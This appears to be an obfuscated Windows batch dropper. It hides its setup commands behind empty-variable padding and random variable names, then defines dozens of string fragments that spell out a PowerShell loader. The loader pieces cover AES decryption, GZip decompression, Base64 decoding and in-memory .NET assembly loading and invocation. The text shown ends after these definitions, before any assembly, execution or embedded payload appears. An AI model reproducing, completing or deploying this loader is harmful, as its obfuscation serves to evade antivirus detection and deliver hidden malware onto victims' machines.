@echo off
%IfUWYSMnddTjFqYhqpXU%s%IfUWYSMnddTjFqYhqpXU%e%IfUWYSMnddTjFqYhqpXU%t%IfUWYSMnddTjFqYhqpXU%l%IfUWYSMnddTjFqYhqpXU%o%IfUWYSMnddTjFqYhqpXU%c%IfUWYSMnddTjFqYhqpXU%a%IfUWYSMnddTjFqYhqpXU%l%IfUWYSMnddTjFqYhqpXU% %IfUWYSMnddTjFqYhqpXU%e%IfUWYSMnddTjFqYhqpXU%n%IfUWYSMnddTjFqYhqpXU%a%IfUWYSMnddTjFqYhqpXU%b%IfUWYSMnddTjFqYhqpXU%l%IfUWYSMnddTjFqYhqpXU%e%IfUWYSMnddTjFqYhqpXU%d%IfUWYSMnddTjFqYhqpXU%e%IfUWYSMnddTjFqYhqpXU%l%IfUWYSMnddTjFqYhqpXU%a%IfUWYSMnddTjFqYhqpXU%y%IfUWYSMnddTjFqYhqpXU%e%IfUWYSMnddTjFqYhqpXU%d%IfUWYSMnddTjFqYhqpXU%e%IfUWYSMnddTjFqYhqpXU%x%IfUWYSMnddTjFqYhqpXU%p%IfUWYSMnddTjFqYhqpXU%a%IfUWYSMnddTjFqYhqpXU%n%IfUWYSMnddTjFqYhqpXU%s%IfUWYSMnddTjFqYhqpXU%i%IfUWYSMnddTjFqYhqpXU%o%IfUWYSMnddTjFqYhqpXU%n%IfUWYSMnddTjFqYhqpXU%
set "bNloHXFzEqiOVifLKqkd=s"
set "WTxWrMlvvGlApsQCXBse=t"
set "ypooFfRwFIfReLvuxonc=!bNloHXFzEqiOVifLKqkd!e!WTxWrMlvvGlApsQCXBse!"
!ypooFfRwFIfReLvuxonc! "aXbhQDcKdW=')($"
!ypooFfRwFIfReLvuxonc! "cLVeqdFQjb=IO.C"
!ypooFfRwFIfReLvuxonc! "yEibPuCGnt=pose"
!ypooFfRwFIfReLvuxonc! "FDvHaZFfkJ=on ("
!ypooFfRwFIfReLvuxonc! "LtwAFxbLOT=pt_f"
!ypooFfRwFIfReLvuxonc! "OGGIixyFWx=aylo"
!ypooFfRwFIfReLvuxonc! "tvPjRObXOh=ormF"
!ypooFfRwFIfReLvuxonc! "JkgIwgDdvs=em.S"
!ypooFfRwFIfReLvuxonc! "mbgOXtxnrk=inal"
!ypooFfRwFIfReLvuxonc! "KGjAlcIzAh=));$"
!ypooFfRwFIfReLvuxonc! "EqybYarOsz=Invo"
!ypooFfRwFIfReLvuxonc! "OBaXhbWcQH=4=')"
!ypooFfRwFIfReLvuxonc! "LPYPNOelnm=tS46"
!ypooFfRwFIfReLvuxonc! "HWmEYdokfv=trea"
!ypooFfRwFIfReLvuxonc! "HpbLBhNBuL=func"
!ypooFfRwFIfReLvuxonc! "FavPyarAOa=]]$U"
!ypooFfRwFIfReLvuxonc! "qhoWOjrzyW=rn_v"
!ypooFfRwFIfReLvuxonc! "zrojBsBQeG=mory"
!ypooFfRwFIfReLvuxonc! "CvrDCVYjCO=m.Re"
!ypooFfRwFIfReLvuxonc! "RfIWOJvRfd=-Obj"
!ypooFfRwFIfReLvuxonc! "CscasHSvLV=ar;}"
!ypooFfRwFIfReLvuxonc! "jmXZsDbYEL=ion "
!ypooFfRwFIfReLvuxonc! "VfyLvpGxrZ=cute"
!ypooFfRwFIfReLvuxonc! "EWadFwBYCv=or_v"
!ypooFfRwFIfReLvuxonc! "HQXCmjeXes=();	"
!ypooFfRwFIfReLvuxonc! "bjazPbNOOS=r (,"
!ypooFfRwFIfReLvuxonc! "XEICdqjqMN=load"
!ypooFfRwFIfReLvuxonc! "clVNfJqLQj=am(,"
!ypooFfRwFIfReLvuxonc! "gmFDeoDeDe=ptog"
!ypooFfRwFIfReLvuxonc! "HKEIXRsdiP=mpre"
!ypooFfRwFIfReLvuxonc! "UjfYYNGNyO=var)"
!ypooFfRwFIfReLvuxonc! "mqADWbAfpg=-4] "
!ypooFfRwFIfReLvuxonc! "rNfOQsRRrm=jF6F"
!ypooFfRwFIfReLvuxonc! "nenBUMkmru=r);}"
!ypooFfRwFIfReLvuxonc! "AmGRPkIeZS=7;	$"
!ypooFfRwFIfReLvuxonc! "gOquvilfIb=_var"
!ypooFfRwFIfReLvuxonc! "yygMDPnupR=nver"
!ypooFfRwFIfReLvuxonc! "gYcGrecpel=r_va"
!ypooFfRwFIfReLvuxonc! "raDTcVSLjd=('::"
!ypooFfRwFIfReLvuxonc! "hGrBYTgIbU=Crea"
!ypooFfRwFIfReLvuxonc! "rbIbwcbVRt=_var"
!ypooFfRwFIfReLvuxonc! "FvdDPAXoVZ=rJnS"
!ypooFfRwFIfReLvuxonc! "iWjjmRiHxr=yste"
!ypooFfRwFIfReLvuxonc! "EFzwPJFTXK=$dec"
!ypooFfRwFIfReLvuxonc! "EJVZTMyfPQ=ing["
!ypooFfRwFIfReLvuxonc! "VVhyjZvDEc=[str"
!ypooFfRwFIfReLvuxonc! "jNnwKNqMHb=ecut"
!ypooFfRwFIfReLvuxonc! "cOFQQcgGMc=3);	"
!ypooFfRwFIfReLvuxonc! "WjbDDYgGLs=rJnS"
!ypooFfRwFIfReLvuxonc! "mmpBADMlDw=6] -"
!ypooFfRwFIfReLvuxonc! "vdhcPoCENc=('gn"
!ypooFfRwFIfReLvuxonc! "DegIsNZIMu=ion "
!ypooFfRwFIfReLvuxonc! "ARhoLadplc=tle "
!ypooFfRwFIfReLvuxonc! "ZwDPpbJkQR=PKCS"
!ypooFfRwFIfReLvuxonc! "FRBvTiVPkx=Disp"
!ypooFfRwFIfReLvuxonc! "YwVyZQWYuC=Syst"
!ypooFfRwFIfReLvuxonc! "FHeVjqKGpr=gnir"
!ypooFfRwFIfReLvuxonc! "ouiAftOiET=cryp"
!ypooFfRwFIfReLvuxonc! "fcZXCyGzww=	$oF"
!ypooFfRwFIfReLvuxonc! "EvPvQepDUb=Copy"
!ypooFfRwFIfReLvuxonc! "VxWbfSrmWK=, 0,"
!ypooFfRwFIfReLvuxonc! "EpsiqiPFod=[0])"
!ypooFfRwFIfReLvuxonc! "JfGjtZrTrg=ypt_"
!ypooFfRwFIfReLvuxonc! "IyExFWaNFq=tor_"
!ypooFfRwFIfReLvuxonc! "YRXqezsuvG=ert]"
!ypooFfRwFIfReLvuxonc! "fBWaloiNNp=Y.Su"
!ypooFfRwFIfReLvuxonc! "xurPwpVjYT=ggHr"
!ypooFfRwFIfReLvuxonc! "FIJnrWSTZE=\');"
!ypooFfRwFIfReLvuxonc! "HTzpDeQiyJ=ject"
!ypooFfRwFIfReLvuxonc! "tHTqQEqUSQ=3mNi"
!ypooFfRwFIfReLvuxonc! "idVsPVbZuR=Conv"
!ypooFfRwFIfReLvuxonc! "dZXqYeogYW=Line"
!ypooFfRwFIfReLvuxonc! "UWySKFHvtm=tion"
!ypooFfRwFIfReLvuxonc! "nLftDjfuMq=ram_"
!ypooFfRwFIfReLvuxonc! "PzDRRibYEa=Syst"
!ypooFfRwFIfReLvuxonc! "ggLCzCFLiC=.Cip"
!ypooFfRwFIfReLvuxonc! "qfswZKmEhx=c);	"
!ypooFfRwFIfReLvuxonc! "QvemAxrfCD=ep b"
!ypooFfRwFIfReLvuxonc! "NAGjFlgRAU==dec"
!ypooFfRwFIfReLvuxonc! "DvCTRFEvkE='%*'"
!ypooFfRwFIfReLvuxonc! "bbNOifeaPe=txeT"
!ypooFfRwFIfReLvuxonc! "hsjAIvNWJl=payl"
!ypooFfRwFIfReLvuxonc! "fNCHfrKcxN=onme"
!ypooFfRwFIfReLvuxonc! "wTTdLZkMVW=iav="
!ypooFfRwFIfReLvuxonc! "rFeYMwTXOQ=Y.St"
!ypooFfRwFIfReLvuxonc! "YejrKKjmlW=aram"
!ypooFfRwFIfReLvuxonc! "FIDbqxKgao=)($p"
!ypooFfRwFIfReLvuxonc! "trFQojPSLD=aes_"
!ypooFfRwFIfReLvuxonc! "ffzrnpZbBr= $nu"
!ypooFfRwFIfReLvuxonc! "zhfnxHLAJS=decr"
!ypooFfRwFIfReLvuxonc! "cbqPmHnhEK=s8W3"
!ypooFfRwFIfReLvuxonc! "ifjWWBohRu=iQZc"
!ypooFfRwFIfReLvuxonc! "fHlFcPBZWi=yste"
!ypooFfRwFIfReLvuxonc! "NKhLafuyuZ=Deco"
!ypooFfRwFIfReLvuxonc! "oPmcYwahrN=_var"
!ypooFfRwFIfReLvuxonc! "QXFDPPgkXh=bstr"
!ypooFfRwFIfReLvuxonc! "TNFwlFRJCu=Cryp"
!ypooFfRwFIfReLvuxonc! "GMnINqfeeJ= dec"
!ypooFfRwFIfReLvuxonc! "sHjKNhguGZ=ypto"
!ypooFfRwFIfReLvuxonc! "PcOmIeghdF=	$de"
!ypooFfRwFIfReLvuxonc! "CBBrLxqFdb=essi"
!ypooFfRwFIfReLvuxonc! "FKUFBpoyUV=HPs1"
!ypooFfRwFIfReLvuxonc! "emxlsioMZK=Ham3"
!ypooFfRwFIfReLvuxonc! "VAyYqYHLQT=46es"
!ypooFfRwFIfReLvuxonc! "OnlGLUMOgC='')("
!ypooFfRwFIfReLvuxonc! "kaDAKWSsfs=h ($"
!ypooFfRwFIfReLvuxonc! "NjMloWNgHf=::CB"
!ypooFfRwFIfReLvuxonc! "IzGokUMfnO=WulU"
!ypooFfRwFIfReLvuxonc! "sPABBzFglx=oad2"
!ypooFfRwFIfReLvuxonc! "rbrBbpElJH=wUI."
!ypooFfRwFIfReLvuxonc! "gkyCxiQfpB=es_v"
!ypooFfRwFIfReLvuxonc! "QdCHFqogAN=y.Pa"
!ypooFfRwFIfReLvuxonc! "deeEwstgwR=th);"
!ypooFfRwFIfReLvuxonc! "NaKlnsuVhU=omma"
